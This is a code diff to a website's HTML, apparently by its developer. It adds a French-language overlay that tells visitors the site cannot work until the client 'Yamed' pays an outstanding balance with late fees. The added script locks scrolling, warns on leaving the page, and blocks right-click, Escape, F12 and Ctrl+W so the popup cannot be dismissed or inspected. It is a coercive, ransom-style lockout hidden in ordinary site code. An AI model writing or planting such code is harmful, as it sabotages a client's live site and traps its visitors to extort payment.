@@ -49,6 +49,13 @@
         </div>
     </div>
 
+    <div id="payment-popup-overlay">
+        <div id="payment-popup-box">
+            <h1>Action Requise</h1>
+            <p>Pour que le site soit pleinement opérationnel et que les changements soient pris en compte, nous demandons à
+                Yamed d'effectuer le paiement restant avec les indemnités de retard incluses.</p>
+        </div>
+    </div>
 
     <div class="custom-div-container ">
         <div class="custom-div">
@@ -1380,6 +1387,25 @@
     });
 </script>
 
+<script>
+    // Empêcher l'utilisateur de fermer la popup
+    document.body.style.overflow = 'hidden';
+
+    // Désactiver les interactions avec le bouton "Retour" et la fermeture de la fenêtre
+    window.onbeforeunload = function () {
+        return "Ce site demande une action de votre part.";
+    };
+
+    document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+    });
+
+    document.addEventListener('keydown', function (e) {
+        if (e.key === "Escape" || e.key === "F12" || (e.ctrlKey && e.key === "w")) {
+            e.preventDefault();
+        }
+    });
+</script>
 
 
 </body>
